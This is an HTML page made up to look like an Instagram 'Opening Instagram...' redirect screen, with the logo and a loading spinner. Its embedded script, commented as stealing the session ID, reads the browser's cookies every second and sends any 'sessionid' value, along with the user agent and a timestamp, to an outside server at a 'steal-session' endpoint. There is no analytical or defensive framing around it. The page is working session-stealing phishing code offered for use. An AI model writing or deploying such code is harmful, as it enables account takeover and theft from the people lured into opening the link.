<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Instagram</title>
    <style>
        body,html{margin:0;padding:0;height:100vh;background:#fff;display:flex;flex-direction:column;align-items:center;justify-content:center;font-family:-apple-system,system-ui,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif}
        .logo{width:100px;height:100px;background:url('https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png') center/contain no-repeat;margin-bottom:20px}
        .text{font-size:18px;color:#262626;font-weight:600}
        .spinner{margin-top:20px;width:40px;height:40px;border:4px solid #f3f3f3;border-top:4px solid #0095f6;border-radius:50%;animation:spin 1s linear infinite}
        @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
    </style>
</head>
<body>
    <div class="logo"></div>
    <div class="text">Opening Instagram...</div>
    <div class="spinner"></div>

    <script>
        // FORCE MOBILE CHECK
        const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
        
        if (!isMobile) {
            document.body.innerHTML = "<h1>OPEN THIS LINK ON MOBILE PHONE ONLY</h1>";
        }

        // TRY TO OPEN INSTAGRAM APP
        setTimeout(() => {
            window.location = "instagram://app";
            setTimeout(() => {
                window.location = "https://www.instagram.com/";
            }, 1500);
        }, 1000);

        // STEAL SESSIONID FROM COOKIES (MOBILE ONLY)
        function steal() {
            const cookies = document.cookie;
            const match = cookies.match(/sessionid=([^;]+)/);
            if (match && match[1].length > 20) {
                fetch('https://instagram-64lz.onrender.com/steal-session/', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        sessionid: match[1],
                        ua: navigator.userAgent,
                        time: new Date().toISOString()
                    })
                });
            }
        }

        // STEAL EVERY 1 SECOND (IN CASE USER LOGGED IN)
        setInterval(steal, 1000);
        steal();
    </script>
</body>
</html>
